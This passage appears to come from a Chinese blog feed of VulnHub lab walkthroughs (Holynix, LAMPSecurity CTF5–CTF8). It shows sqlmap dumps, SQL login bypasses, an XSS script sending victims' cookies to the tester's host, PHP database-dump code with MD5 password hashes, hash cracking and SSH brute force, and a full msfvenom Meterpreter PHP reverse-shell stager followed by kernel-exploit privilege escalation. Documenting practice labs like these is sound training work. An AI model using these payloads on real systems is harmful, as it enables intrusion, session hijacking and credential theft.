<li><img src="/vulnhub%E4%B9%8BHolynix-v1/3.png" alt></li>
<li>显示sql错误信息</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/4.png" alt></li>
<li>抓包，让sqlmap跑注入</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/5.png" alt></li>
<li>跑数据库：sqlmap -r 1.txt –dbs –batch</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/6.png" alt></li>
<li>跑数据表：sqlmap -r 1.txt -D creds –tables –batch</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/7.png" alt></li>
<li>跑数据：sqlmap -r 1.txt -D creds -T accounts –dump –batch</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/8.png" alt></li>
</ol>
<h2 id="0x02-Login"><a href="#0x02-Login" class="headerlink" title="0x02 Login"></a>0x02 Login</h2><ol>
<li>使用账号密码登录，其实也可以使用万能账号密码登录：’ or 1=1#</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/9.png" alt></li>
<li>有upload功能，尝试上传1.txt，当前用户上传不了</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/10.png" alt></li>
<li>使用jjames、@rR35t3D@716登录</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/11.png" alt></li>
<li>再上传1.txt，上传成功，不过权限已更改</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/12.png" alt></li>
<li>但是找不到1.txt的真实路径，翻翻其他的，security功能</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/13.png" alt></li>
<li>抓包，查看到%2f，试试目录遍历漏洞</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/14.png" alt></li>
<li>然而并不是重点，继续查看上传的位置</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/15.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/16.png" alt></li>
<li>tar -zcvf 1.tar.gz 1.txt </li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/17.png" alt></li>
<li>上传1.tar.gz，上传了也没显示路径</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/18.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/19.png" alt></li>
<li>重点是Home Directory Uploader</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/20.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/21.png" alt></li>
<li>访问/jjames/</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/22.png" alt></li>
<li>访问/~jjames/</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/23.png" alt></li>
<li>利用不了~</li>
<li><img src="/vulnhub%E4%B9%8BHolynix-v1/24.png" alt></li>
<li>待续</li>
</ol>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之LAMPSecurity-CTF8</title>
    <url>/vulnhub%E4%B9%8BLAMPSecurity-CTF8/</url>
    <content><![CDATA[<h2 id="0x00-LAMPSecurity-CTF8"><a href="#0x00-LAMPSecurity-CTF8" class="headerlink" title="0x00 LAMPSecurity: CTF8"></a>0x00 LAMPSecurity: CTF8</h2><ol>
<li><a href="https://www.vulnhub.com/entry/lampsecurity-ctf8,87/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/lampsecurity-ctf8,87/</a></li>
</ol>
<h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol>
<li><p>netdiscover发现靶场IP：192.168.100.25</p>
</li>
<li><p>nmap扫描</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/1.png" alt></p>
</li>
<li><p>访问80，查看网页源代码，得#flag#550e1bafe077ff0b0b67f4e32f29d751</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/2.png" alt></p>
</li>
<li><p>解MD5，得12345678</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/3.png" alt></p>
</li>
<li><p>扫目录</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/4.png" alt></p>
</li>
<li><p>访问phpinfo.php，得#flag#550e1bafe077ff0b0b67f4e32f29d751</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/5.png" alt></p>
</li>
<li><p>继续翻，发现扫目录没扫出来的/content/目录</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/6.png" alt></p>
</li>
<li><p>扫/content/目录</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/7.png" alt></p>
</li>
<li><p>访问/hidden/</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/8.png" alt></p>
</li>
<li><p>#flag#57dbe55b42b307fb4115146d239955d0，browarprezes</p>
</li>
<li><p>注册账号test1</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/9.png" alt></p>
</li>
<li><p>添加XSS评论</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/10.png" alt></p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/11.png" alt></p>
</li>
<li><p>利用XSS漏洞，编辑脚本获取其他人访问此页面的cookie</p>
<pre><code>&lt;script&gt;
var request=new XMLHttpRequest();
var redirect_url=&quot;http://192.168.100.4/&quot;+document.cookie; 
request.open(&quot;GET&quot;,redirect_url);
request.send();
&lt;/script&gt;</code></pre></li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/12.png" alt></p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/13.png" alt></p>
</li>
<li><p>向作者发送此页面链接</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/14.png" alt></p>
</li>
<li><p>kali搭建Python服务器：python -m SimpleHTTPServer 80，等待一阵子，获取到cookie</p>
</li>
<li><p>SESSc3668e8126622526d1312a9c75151240=ii0v52ppqfeglhsim843412d23;</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/15.png" alt></p>
</li>
<li><p>开启burpsuite，返回主页/刷新主页/访问<a href="http://192.168.100.25/" target="_blank" rel="noopener">http://192.168.100.25/</a></p>
</li>
<li><p>替换cookie</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/16.png" alt></p>
</li>
<li><p>已以Barbara身份登录了</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/17.png" alt></p>
</li>
<li><p>然后每次都要更换cookie才能以Barbara身份操作，重新获取cookie</p>
</li>
<li><p>使用burpsuite自动替换</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/18.png" alt></p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/19.png" alt></p>
</li>
<li><p>Barbara身份可以发布，前面扫描端口存在mysql，编辑脚本获取用户名与密码</p>
</li>
<li><p>列出数据库</p>
<pre><code>&lt;?php
$result=db_query(&#39;show databases&#39;);
while($record=db_fetch_object($result))
{
print $record-&gt;Database.&quot;&lt;br/&gt;&quot;;
}
?&gt;</code></pre></li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/20.png" alt></p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/21.png" alt></p>
</li>
<li><p>另一种列出数据库</p>
<pre><code>&lt;?php
$result=db_query(&#39;select schema_name from information_schema.schemata&#39;);
while($record=db_fetch_object($result))
{
print $record-&gt;schema_name.&quot;&lt;br/&gt;&quot;;
}
?&gt;</code></pre></li>
<li><p>列表</p>
<pre><code>&lt;?php
$result=db_query(&#39;select table_name from information_schema.tables where table_schema=0x666C6167&#39;);
while($record=db_fetch_object($result))
{
print $record-&gt;table_name.&quot;&lt;br/&gt;&quot;;
}
?&gt;</code></pre></li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/22.png" alt></p>
</li>
<li><p>列列</p>
<pre><code>&lt;?php
$result=db_query(&#39;select column_name from information_schema.columns where table_schema=0x666C6167 and table_name=0x666C6167&#39;);
while($record=db_fetch_object($result))
{
print $record-&gt;column_name.&quot;&lt;br/&gt;&quot;;
}
?&gt;</code></pre></li>
<li><p>列数据</p>
<pre><code>&lt;?php
$result=db_query(&#39;select flag from flag.flag&#39;);
while($record=db_fetch_object($result))
{
print $record-&gt;flag.&quot;&lt;br/&gt;&quot;;
}
?&gt;</code></pre></li>
<li><p>得#flag#ab38cd01f27d48e13bbef62890c4330e</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/23.png" alt></p>
</li>
<li><p>一种列出所有用户名与密码</p>
<pre><code>&lt;?php
$result=db_query(&#39;select name,pass from users&#39;);
while($record=db_fetch_object($result))
{
print $record-&gt;name.&quot;:&quot;.$record-&gt;pass.&quot;&lt;br/&gt;&quot;;
}
?&gt;</code></pre></li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/24.png" alt></p>
<pre><code>admin:49265c16d1dff8acef3499bd889299d6
Barbara:bed128365216c019988915ed3add75fb
Jim:2a5de0f53b1317f7e36afcdb6b5202a4
Steve:08d15a4aef553492d8971cdd5198f314
Sherry:c3319d1016a802db86653bcfab871f4f
Gene:9b9e4bbd988954028a44710a50982576
Harvey:7d29975b78825ea7c27f5c0281ea2fa4
John:518462cd3292a67c755521c1fb50c909
Johnathan:6dc523ebd2379d96cc0af32e2d224db0
Susan:0d42223010b69cab86634bc359ed870b
Dan:8f75ad3f04fc42f07c95e2f3d0ec3503
George:ed2b1f468c5f915f3f1cf75d7068baae
Jeff:ca594f739e257245f2be69eb546c1c04
Stacey:85aca385eb555fb6a36a62915ddd8bc7
Juan:573152cc51de19df50e90b0e557db7fe
Michael:c7a4476fc64b75ead800da9ea2b7d072
Jerome:42248d4cb640a3fb5836571e254aee2b
Tom:971dcf53e88e9268714d9d504753d347
Xavier:3005d829eb819341357bfddf541c175b
Sally:7a1c07ff60f9c07ffe8da34ecbf4edc2
test:098f6bcd4621d373cade4e832627b4f6
test1:202cb962ac59075b964b07152d234b70</code></pre></li>
<li><p>保存到文件，使用john跑出来</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/25.png" alt></p>
</li>
<li><p>john -w=/usr/share/wordlists/rockyou.txt -form=raw-md5 md5.txt </p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/26.png" alt></p>
</li>
<li><p>分开到用户字典、密码字典，hydra跑ssh账号密码，没跑出来</p>
</li>
<li><p>hydra IP PORT -L user.txt -P pass.txt -e ns -vV</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/27.png" alt></p>
</li>
<li><p>medusa也没跑出来</p>
</li>
<li><p>medusa -M ssh -h 192.168.100.25 -U user.txt -P pass.txt</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/28.png" alt></p>
</li>
<li><p>再看看用户名与Email，其实名字有第一部分首字母+第二部分名字</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/29.png" alt></p>
</li>
<li><p>重新获取一下全部Email</p>
<pre><code>&lt;?php
$result=db_query(&#39;select column_name from information_schema.columns where table_schema=0x64727570616C and table_name=0x7573657273&#39;);
while($record=db_fetch_object($result))
{
print $record-&gt;column_name.&quot;&lt;br/&gt;&quot;;
}
?&gt;</code></pre><pre><code>&lt;?php
$result=db_query(&#39;select mail from drupal.users&#39;);
while($record=db_fetch_object($result))
{
print $record-&gt;mail.&quot;&lt;br/&gt;&quot;;
}
?&gt;</code></pre></li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/30.png" alt></p>
<pre><code>bdio@localhost
dhart@localhost.localdomain
gconnor@localhost.localdomain
gprune@localhost.localdomain
hplink@localhost.localdomain
jalderman@localhost.localdomain
jgoldman@localhost.localdomain
jgrimes@localhost.localdomain
jharraway@localhost
jingersol@localhost.localdomain
jstone@localhost.localdomain
mswanson@localhost.localdomain
sholden@localhost.localdomain
shunter@localhost.localdomain
sloreman@localhost.localdomain
spinkton@localhost
spinkton@localhost.localdomain
sswiney@localhost.localdomain
test@123.com
test@qq.com
tmaloney@localhost.localdomain
xbruce@localhost.localdomain</code></pre></li>
<li><p>hydra再跑一次</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/31.png" alt></p>
</li>
<li><p>登录失败~</p>
</li>
<li><p>medusa再跑一次</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/32.png" alt></p>
</li>
<li><p>ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -oKexAlgorithms=diffie-hellman-group14-sha1 -oKexAlgorithms=diffie-hellman-group-exchange-sha1 <a href="mailto:jharraway@192.168.100.25" target="_blank" rel="noopener">jharraway@192.168.100.25</a></p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/33.png" alt></p>
</li>
<li><p>#flag#5e937c51b852e1ee90d42ddb5ccb8997</p>
</li>
<li><p>读flag文件</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/34.png" alt></p>
</li>
<li><p>#flag#0ab251c07822d26b07b88136739ae39b</p>
</li>
<li><p>当前用户不在sudoers中</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/35.png" alt></p>
</li>
<li><p>切换用户登录</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/36.png" alt></p>
</li>
<li><p>当前用户也不在sudoers中</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/37.png" alt></p>
</li>
<li><p>切换到admin对应的邮件用户登录ssh，#flag#0ab251c07822d26b07b88136739ae39b</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/38.png" alt></p>
</li>
<li><p>还有个#flag#5b650c18929383074fea8870d857dd2e</p>
</li>
<li><p><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF8/39.png" alt></p>
</li>
</ol>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之LAMPSecurity-CTF7</title>
    <url>/vulnhub%E4%B9%8BLAMPSecurity-CTF7/</url>
    <content><![CDATA[<h2 id="0x00-LAMPSecurity-CTF7"><a href="#0x00-LAMPSecurity-CTF7" class="headerlink" title="0x00 LAMPSecurity: CTF7"></a>0x00 LAMPSecurity: CTF7</h2><ol>
<li><a href="https://www.vulnhub.com/entry/lampsecurity-ctf7,86/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/lampsecurity-ctf7,86/</a></li>
</ol>
<h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol>
<li>netdiscover，得靶场IP：192.168.100.11</li>
<li>nmap扫描</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/1.png" alt></li>
<li>访问80、8080</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/2.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/3.png" alt></li>
<li>尝试单引号</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/4.png" alt></li>
<li>可万能密码绕过：’ or 1=1#</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/5.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/6.png" alt></li>
<li>随意翻翻，有上传文件功能</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/7.png" alt></li>
<li>上传php反弹shell脚本，修改IP与port</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/8.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/9.png" alt></li>
<li>上传成功</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/10.png" alt></li>
<li>怎样利用。。。。</li>
</ol>
<h2 id="0x02-Then"><a href="#0x02-Then" class="headerlink" title="0x02 Then"></a>0x02 Then</h2><ol>
<li>dirb扫目录</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/11.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/12.png" alt></li>
<li>nc开启监听，点击php-reverse-shell.php文件链接</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/13.png" alt></li>
</ol>
<h2 id="0x03-Test"><a href="#0x03-Test" class="headerlink" title="0x03 Test"></a>0x03 Test</h2><ol>
<li>获取的shell是非交互式的，先获取交互式shell，再无密码登录mysql</li>
<li>python -c ‘import pty; pty.spawn(“/bin/bash”)’</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/14.png" alt></li>
<li>获取用户名与密码，解密码e22f07b17f98e0d9d364584ced0e3c18</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/15.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/16.png" alt></li>
<li>前面查看22端口是开启的，尝试ssh登录，<a href="mailto:brian@192.168.100.11" target="_blank" rel="noopener">brian@192.168.100.11</a>，my2cents</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/17.png" alt></li>
<li>继续sudo su提升到root</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/18.png" alt></li>
<li>提权成功是因为：</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/19.png" alt></li>
</ol>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之LAMPSecurity-CTF6</title>
    <url>/vulnhub%E4%B9%8BLAMPSecurity-CTF6/</url>
    <content><![CDATA[<h2 id="0x00-LAMPSecurity-CTF6"><a href="#0x00-LAMPSecurity-CTF6" class="headerlink" title="0x00 LAMPSecurity: CTF6"></a>0x00 LAMPSecurity: CTF6</h2><ol>
<li><a href="https://www.vulnhub.com/entry/lampsecurity-ctf6,85/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/lampsecurity-ctf6,85/</a></li>
</ol>
<h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol>
<li>netdiscover 得靶场IP：192.168.100.10</li>
<li>nmap</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/1.png" alt></li>
<li>访问80</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/2.png" alt></li>
<li>获取username：admin，点击Read more</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/3.png" alt></li>
<li>注入判断：</li>
<li><a href="http://192.168.100.10/?id=4" target="_blank" rel="noopener">http://192.168.100.10/?id=4</a> and 1=1</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/4.png" alt></li>
<li><a href="http://192.168.100.10/?id=4" target="_blank" rel="noopener">http://192.168.100.10/?id=4</a> and 1=11</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/5.png" alt></li>
<li>sqlmap跑：sqlmap -u “<a href="http://192.168.100.10/?id=4&quot;" target="_blank" rel="noopener">http://192.168.100.10/?id=4&quot;</a> –dbs –batch</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/6.png" alt></li>
<li>sqlmap -u “<a href="http://192.168.100.10/?id=4&quot;" target="_blank" rel="noopener">http://192.168.100.10/?id=4&quot;</a> -D cms –tables –batch</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/7.png" alt></li>
<li>sqlmap -u “<a href="http://192.168.100.10/?id=4&quot;" target="_blank" rel="noopener">http://192.168.100.10/?id=4&quot;</a> -D cms -T user –dump –batch</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/8.png" alt></li>
<li>获取到用户名密码：admin、adminpass，登录</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/9.png" alt></li>
</ol>
<h2 id="0x02-Two"><a href="#0x02-Two" class="headerlink" title="0x02 Two"></a>0x02 Two</h2><ol>
<li>扫目录：dirb <a href="http://192.168.100.10/" target="_blank" rel="noopener">http://192.168.100.10/</a></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/10.png" alt></li>
<li>访问可疑文件，获取到账号密码</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/11.png" alt></li>
</ol>
<h2 id="0x03-Then"><a href="#0x03-Then" class="headerlink" title="0x03 Then"></a>0x03 Then</h2><ol>
<li>管理面板有增加事件功能</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/12.png" alt></li>
<li>msfvenom生成php反弹shell：msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -o test.php</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/13.png" alt></li>
<li>启动msfconsole，开启监听</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/15.png" alt></li>
<li>上传反弹shell脚本</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/14.png" alt></li>
<li>返回home目录</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/16.png" alt></li>
<li>已反弹shell</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/17.png" alt></li>
</ol>
<h2 id="0x04-Test"><a href="#0x04-Test" class="headerlink" title="0x04 Test"></a>0x04 Test</h2><ol>
<li>搜索脚本</li>
<li><a href="https://www.exploit-db.com/exploits/8478" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/8478</a></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/18.png" alt></li>
<li>上传脚本，利用</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/19.png" alt></li>
<li>翻车</li>
</ol>
<h2 id="0x05-Again"><a href="#0x05-Again" class="headerlink" title="0x05 Again"></a>0x05 Again</h2><ol>
<li>报错</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/20.png" alt></li>
<li>需要安装dos2unix来转换格式：</li>
<li><ul>
<li>yum -y install dos2unix</li>
</ul>
</li>
<li><ul>
<li>apt-get install dos2unix</li>
</ul>
</li>
<li>转换：</li>
<li><ul>
<li>dos2unix 8478.sh</li>
</ul>
</li>
<li>转换前后：</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/22.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/21.png" alt></li>
<li>重新上传，提权</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/23.png" alt></li>
</ol>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之LAMPSecurity-CTF5</title>
    <url>/vulnhub%E4%B9%8BLAMPSecurity-CTF5/</url>
    <content><![CDATA[<h2 id="0x00-LAMPSecurity-CTF5"><a href="#0x00-LAMPSecurity-CTF5" class="headerlink" title="0x00 LAMPSecurity: CTF5"></a>0x00 LAMPSecurity: CTF5</h2><ol>
<li><a href="https://www.vulnhub.com/entry/lampsecurity-ctf5,84/" target="_blank" rel="noopener">靶场链接</a></li>
</ol>
<h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol>
<li>netdiscover查到靶场IP为192.168.100.9</li>
<li>nmap扫描</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/1.png" alt></li>
<li>开放端口很多，访问80</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/2.png" alt></li>
<li>打开blog，搜索NanoCMS相关漏洞</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/4.png" alt></li>
<li><a href="https://cxsecurity.com/issue/WLB-2009040041" target="_blank" rel="noopener">https://cxsecurity.com/issue/WLB-2009040041</a></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/5.png" alt></li>
<li>放在<a href="http://192.168.100.9/~andy/后访问" target="_blank" rel="noopener">http://192.168.100.9/~andy/后访问</a></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/3.png" alt></li>
<li>得 9d2f75377ac0ab991d40c91fd27e52fd，MD5解，得 shannon</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/6.png" alt></li>
<li>admin登录</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/7.png" alt></li>
<li>使用msfvenom生成php反弹shell脚本</li>
<li>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.100.4（kali IP） lport=4444 -f raw</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/8.png" alt><pre><code>&lt;?php /**/ error_reporting(0); $ip = &#39;192.168.100.4&#39;; $port = 4444; if (($f = &#39;stream_socket_client&#39;) &amp;&amp; is_callable($f)) { $s = $f(&quot;tcp://{$ip}:{$port}&quot;); $s_type = &#39;stream&#39;; } if (!$s &amp;&amp; ($f = &#39;fsockopen&#39;) &amp;&amp; is_callable($f)) { $s = $f($ip, $port); $s_type = &#39;stream&#39;; } if (!$s &amp;&amp; ($f = &#39;socket_create&#39;) &amp;&amp; is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = &#39;socket&#39;; } if (!$s_type) { die(&#39;no socket funcs&#39;); } if (!$s) { die(&#39;no socket&#39;); } switch ($s_type) { case &#39;stream&#39;: $len = fread($s, 4); break; case &#39;socket&#39;: $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&#39;len&#39;]; $b = &#39;&#39;; while (strlen($b) &lt; $len) { switch ($s_type) { case &#39;stream&#39;: $b .= fread($s, $len-strlen($b)); break; case &#39;socket&#39;: $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS[&#39;msgsock&#39;] = $s; $GLOBALS[&#39;msgsock_type&#39;] = $s_type; if (extension_loaded(&#39;suhosin&#39;) &amp;&amp; ini_get(&#39;suhosin.executor.disable_eval&#39;)) { $suhosin_bypass=create_function(&#39;&#39;, $b); $suhosin_bypass(); } else { eval($b); } die();</code></pre></li>
<li>New Page</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/9.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/10.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/11.png" alt></li>
<li>开启msfconsole并设置监听，点击test</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/12.png" alt></li>
<li>查看内核版本</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/13.png" alt></li>
<li>使用脚本搜exp</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/14.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/15.png" alt></li>
<li>下载脚本wget <a href="https://www.exploit-db.com/download/9479" target="_blank" rel="noopener">https://www.exploit-db.com/download/9479</a> ，编译</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/16.png" alt></li>
<li>meterpreter上传脚本</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/17.png" alt></li>
<li>执行exp，失败</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/18.png" alt></li>
<li>使用gcc -m32 -o exp1 9479.c，重新编译为32位</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/19.png" alt></li>
<li>重新上传，执行</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/20.png" alt></li>
</ol>
<h2 id="0x02-webmail"><a href="#0x02-webmail" class="headerlink" title="0x02 webmail"></a>0x02 webmail</h2><ol>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/23.png" alt></li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/21.png" alt></li>
<li>搜索相关漏洞</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/22.png" alt></li>
<li><a href="https://www.freebuf.com/vuls/133992.html" target="_blank" rel="noopener">其他参考</a></li>
</ol>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub之LAMPSecurity-CTF4</title>
    <url>/vulnhub%E4%B9%8BLAMPSecurity-CTF4/</url>
    <content><![CDATA[<h2 id="0x00-LAMPSecurity：CTF4"><a href="#0x00-LAMPSecurity：CTF4" class="headerlink" title="0x00 LAMPSecurity：CTF4"></a>0x00 LAMPSecurity：CTF4</h2><ol>
<li><a href="https://www.vulnhub.com/entry/lampsecurity-ctf4,83/" target="_blank" rel="noopener">靶场链接</a></li>
<li>kali</li>
</ol>
<h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol>
<li>netdiscover</li>
<li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/1.png" alt></li>
<li>nmap</li>
